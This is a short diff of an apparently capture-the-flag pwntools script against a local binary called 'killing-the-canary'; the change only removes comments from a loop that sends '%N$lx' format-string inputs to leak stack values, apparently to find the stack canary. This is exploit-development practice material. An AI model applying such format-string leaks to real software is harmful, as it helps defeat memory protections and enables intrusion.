@@ -4,10 +4,10 @@ from pwn import *
 
 BIN = "./killing-the-canary"
 # 1 , 19 , 33 , 36 , 41 , 46
-for i in range(10, 20):                     # widen range if needed
+for i in range(10, 20):                   
     p = process(BIN)
     p.recvuntil(b"What's your name? ")
-    p.sendline(f"%{i}$lx".encode())        # print i-th stack arg in HEX
+    p.sendline(f"%{i}$lx".encode())       
 
     # Program prints: "Hello, <expansion>! Let's play a game."
     line = p.recvuntil(b"! Let's play a game.\n", drop=False)
